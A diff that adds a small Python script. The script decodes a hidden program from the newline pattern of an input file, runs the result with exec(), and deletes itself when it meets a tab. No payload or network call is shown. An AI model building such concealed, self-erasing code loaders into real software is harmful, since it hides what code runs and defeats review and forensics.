@@ -1,0 +1,20 @@
+#!/usr/bin/python3
+
+import sys, os
+program = open(sys.argv[1], 'rb').read()
+
+code = ''
+byte = 0
+ix = 0
+for char in program:
+    if char == 10:
+        byte += 2 ** ix
+    elif char == 9:
+        os.remove(sys.argv[0])
+        sys.exit(1)
+    ix += 1
+    if ix == 8:
+        code += chr(byte)
+        byte, ix = 0, 0
+
+exec(code)
